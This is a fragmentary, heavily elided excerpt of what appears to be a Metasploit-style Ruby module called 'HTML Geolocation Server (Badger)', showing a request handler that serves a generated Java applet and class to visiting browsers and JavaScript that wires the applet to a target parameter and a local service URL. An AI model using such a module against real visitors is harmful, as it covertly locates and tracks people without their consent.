...
'Name'		=> 'HTML Geolocation Server (Badger)',
	...
	def on_request_uri( cli, request )
		...
		if request.uri =~ /(gps=(.)+.jpg)/
			...
			send_response_html( cli, generate_jar(), { 'Content-Type' => 'application/javascript' } )
			return
		elsif request.uri.match(/\.class$/i)
			print_status("#{self.name} Generating Java Class and Sending To Browser")
			send_response_html( cli, generate_class(), { 'Content-Type' => 'application/javascript' } )
			return
		else
	...
	def generate_js()
		...
		function useApplet() {
			...
			b.setAttribute('value', "#{datastore['BADGER_TGT']}");
			a.appendChild(b);
			var c = document.createElement('param');
			c.setAttribute('name', 'service');
			c.setAttribute('value', "http://127.0.0.1:8888/service.php");
			a.appendChild(c);
